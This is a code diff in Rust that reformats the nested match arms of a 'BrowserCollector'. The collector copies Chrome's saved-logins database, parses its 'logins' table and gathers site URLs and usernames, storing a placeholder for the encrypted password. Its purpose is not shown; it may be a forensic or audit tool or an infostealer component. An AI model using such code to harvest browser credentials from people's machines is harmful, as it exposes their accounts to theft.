@@ -71,33 +71,29 @@ impl BrowserCollector {
                 }
 
                 match SqliteReader::open(&temp_path) {
-                    Ok(mut reader) => {
-                        match reader.find_table_root("logins") {
-                            Ok(root_page) => {
-                                match reader.scan_table(root_page) {
-                                    Ok(rows) => {
-                                        for row in rows {
-                                            if row.len() > 5 {
-                                                let url = row[0].as_string().unwrap_or_default();
-                                                let username = row[3].as_string().unwrap_or_default();
-                                                
-                                                if !url.is_empty() && !username.is_empty() {
-                                                    collected_creds.push(BrowserCredential {
-                                                        url,
-                                                        username,
-                                                        password: Some("[ENCRYPTED_PASSWORD]".to_string()),
-                                                        browser: "Chrome".to_string(),
-                                                    });
-                                                }
-                                            }
+                    Ok(mut reader) => match reader.find_table_root("logins") {
+                        Ok(root_page) => match reader.scan_table(root_page) {
+                            Ok(rows) => {
+                                for row in rows {
+                                    if row.len() > 5 {
+                                        let url = row[0].as_string().unwrap_or_default();
+                                        let username = row[3].as_string().unwrap_or_default();
+
+                                        if !url.is_empty() && !username.is_empty() {
+                                            collected_creds.push(BrowserCredential {
+                                                url,
+                                                username,
+                                                password: Some("[ENCRYPTED_PASSWORD]".to_string()),
+                                                browser: "Chrome".to_string(),
+                                            });
                                         }
                                     }
-                                    Err(e) => eprintln!("Failed to scan 'logins' table: {:?}", e),
                                 }
                             }
-                            Err(e) => eprintln!("Failed to find 'logins' table: {:?}", e),
-                        }
-                    }
+                            Err(e) => eprintln!("Failed to scan 'logins' table: {:?}", e),
+                        },
+                        Err(e) => eprintln!("Failed to find 'logins' table: {:?}", e),
+                    },
                     Err(e) => eprintln!("Failed to open Chrome DB {:?}: {:?}", temp_path, e),
                 }
                 let _ = fs::remove_file(&temp_path); // Clean up temp file
